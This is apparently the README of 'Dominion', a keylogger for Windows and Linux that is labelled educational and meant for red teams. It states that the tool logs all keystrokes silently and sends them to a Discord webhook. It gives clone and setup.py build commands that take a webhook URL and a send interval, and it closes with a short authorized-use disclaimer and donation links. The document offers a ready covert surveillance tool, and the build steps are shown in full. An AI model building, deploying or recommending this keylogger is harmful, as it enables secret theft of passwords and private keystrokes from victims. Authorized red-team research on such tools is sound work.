# Dominion

![Dominion Banner](assets/dominion_banner.png)
[![Docs](https://img.shields.io/badge/Wiki-Docs-green?style=plastic&logo=wikipedia)](https://github.com/HackScaleTeam/Dominion/wiki)
[![Twitter URL](https://img.shields.io/twitter/follow/HackScale?style=plastic&logo=twitter)](https://twitter.com/_hackscale_)
[![Twitter URL](https://img.shields.io/twitter/follow/Samx86?style=plastic&logo=twitter)](https://twitter.com/sam_X86_)
[![YouTube URL](https://img.shields.io/youtube/channel/views/UCGY_Cnhao2lebIIYYb2jovA?style=plastic&logo=youtube)](https://www.youtube.com/channel/UCGY_Cnhao2lebIIYYb2jovA)
[![Donate with PayPal](https://img.shields.io/badge/PayPal-Donate-blue?style=plastic&logo=paypal)](https://paypal.me/HafizMohammed766)
[![Donate Bitcoin](https://img.shields.io/badge/Bitcoin-BTC-orange?style=plastic&logo=bitcoin)](https://s.binance.com/SQ9HmxEB) 

Dominion is a cross-platform educational keylogger for Red Teams and ethical hacking research.  
It captures keystrokes and sends logs to a private Discord channel using webhooks.

[Click here for a video demonstration](https://youtu.be/gZNiMI4EFMs?si=ISUGVQrQUUNkKG9u)

---

## Features

- Logs all keystrokes silently.
- Sends logs to a private Discord webhook.
- Supports Windows EXE (Wine) and Linux binary.
- Simple automated builder (`setup.py`).

---

## Quick Start

Clone this repository:

```bash
git clone https://github.com/HackScaleTeam/Dominion.git
cd Dominion
```

Run the setup script:

**For Windows EXE (via Wine):**
```bash
python3 setup.py --webhook YOUR_DISCORD_WEBHOOK --interval YOUR_TIME --windows
```

**For Linux binary:**
```bash
python3 setup.py --webhook YOUR_DISCORD_WEBHOOK --interval YOUR_TIME --linux
```

The setup script will:
- Check your environment (Wine/Python)
- Install missing dependencies
- Build the binary to `/dist/`

**Example:**
```bash
python3 setup.py --webhook https://discord.com/api/webhooks/XXXXX/YYYYY --interval YOUR_TIME --windows
```

---

## License

MIT License — see [LICENSE](LICENSE).

---

## Disclaimer

Dominion is for **educational and authorized testing only**.  
Use it only on machines you own or have permission to test.


## Support / Donate

If you find this project useful, you can support development via [PayPal](https://paypal.me/HafizMohammed766) or [Bitcoin](https://s.binance.com/SQ9HmxEB).

Thanks for supporting the project! 💙


